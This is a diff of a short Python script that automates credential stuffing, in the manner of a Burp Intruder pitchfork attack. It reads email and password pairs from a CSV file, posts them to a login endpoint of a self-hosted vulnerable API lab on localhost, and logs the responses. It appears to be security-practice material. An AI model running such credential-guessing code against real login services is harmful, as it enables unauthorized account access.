@@ -1,6 +1,6 @@
 '''
-Script for fuzzing 2 parameters simultaneously in a POST JSON body. Similar to Burp Intruder Pitchfork 
-attack type without the Community Edition rate limit.
+Script for fuzzing 2 parameters simultaneously in a JSON POST request. 
+Similar to Burp Intruder Pitchfork attack type without the Community Edition limitations.
 
 Proxying through Burp can be done using envrionment variables:
 
@@ -15,16 +15,24 @@ export HTTP_PROXY="http://127.0.0.1:8080"
 export HTTPS_PROXY="http://127.0.0.1:8080"
 '''
 
-import requests
+import requests, csv
 
-target = '127.0.0.1'
+# Testing on self-hosted vulnerable API: https://github.com/roottusk/vapi
+url = 'http://127.0.0.1/vapi/api2/user/login'
 
-def api2_post_login(email, password):
-    url = f'http://{target}/vapi/api2/user/login'
+def login(email, password):
     payload = {'email': email.rstrip(),'password': password.rstrip()}
-    r = requests.post(url, json=payload)
-    return r
+    response = requests.post(url, json=payload)
+    return response
 
+
+# Creating credentials tuple from csv
+with open('creds.csv', newline='') as f:
+    reader = csv.reader(f)
+    credentials = [tuple(row) for row in reader]
+
+'''
+# Creating credentials tuple from 2 seperate files
 with open('emails.txt', 'r') as f:
     emails = f.readlines()
 
@@ -32,10 +40,12 @@ with open('passwords.txt', 'r') as f:
     passwords = f.readlines()
 
 credentials = zip(emails, passwords)
+'''
 
+# Saving responses to results.txt
 with open('results.txt', 'a') as f:
     for cred in credentials:
         e, p = cred
-        response = api2_post_login(e, p)
+        response = login(e, p)
         f.write(str(response.status_code) + ' ' + str(response.json()) + '\n')
     f.close()
